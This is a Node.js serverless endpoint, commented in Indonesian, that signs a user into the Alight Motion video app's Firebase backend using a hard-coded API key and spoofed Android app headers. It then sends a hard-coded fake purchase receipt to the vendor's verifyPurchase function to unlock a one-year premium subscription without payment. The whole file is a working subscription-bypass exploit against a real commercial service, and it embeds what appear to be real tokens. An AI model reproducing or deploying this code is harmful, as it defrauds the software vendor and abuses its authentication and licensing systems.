const axios = require('axios');

const ALIGHT_API_KEY = 'AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0';
const ID_TOOLKIT = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty';
// INI SERVER ASLI ALIGHT MOTION YANG RENTAN
const VERIFY_PURCHASE_URL = 'https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase';

const androidHeaders = {
  'content-type': 'application/json',
  'x-android-package': 'com.alightcreative.motion',
  'x-android-cert': 'ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8',
  'user-agent': 'dalvik/2.1.0 (linux; u; android 15; 23127pn0cc build/bp1a.250505.005)'
};

// STRUK AJAIB (Magic Receipt Token) yang bikin server Alight Motion langsung kasih premium
const MAGIC_RECEIPT_TOKEN = 'mmgaabamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw';

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).end();
  const { email, magicLink } = req.body;

  try {
    // 1. Ambil oobCode dari link yang di-paste user
    const url = new URL(magicLink);
    let oobCode = url.searchParams.get('oobCode');
    if (!oobCode) {
        const nested = url.searchParams.get('link');
        if (nested) oobCode = new URL(nested).searchParams.get('oobCode');
    }

    // 2. Login ke Firebase Alight Motion pakai oobCode (Dapetin ID Token User)
    const authRes = await axios.post(`${ID_TOOLKIT}/emailLinkSignin?key=${ALIGHT_API_KEY}`, {
      email: email, oobCode: oobCode, clientType: 'CLIENT_TYPE_ANDROID'
    }, { headers: androidHeaders });

    const firebaseIdToken = authRes.data.idToken;

    // 3. EKSEKUSI BYPASS: Kirim Struck Ajaib ke server verifyPurchase
    const orderId = 'newr-' + Math.random().toString(36).substring(2, 8);
    const verifyPayload = {
      data: {
        productId: 'am.full.sub.annual.19q4', // Paket Premium 1 Tahun
        token: MAGIC_RECEIPT_TOKEN, // Struck Palsu/Ajaib
        skuType: 'subs',
        orderId: orderId
      }
    };

    const verifyRes = await axios.post(VERIFY_PURCHASE_URL, verifyPayload, {
      headers: { 
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.12.1',
        'firebase-instance-id-token': 'cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI',
        authorization: 'Bearer ' + firebaseIdToken 
      }
    });

    res.json({ success: true, message: 'PREMIUM INJECTED KE SERVER ALIGHT!', orderId: orderId });
  } catch (err) {
    res.status(500).json({ success: false, error: err.response?.data || err.message });
  }
};
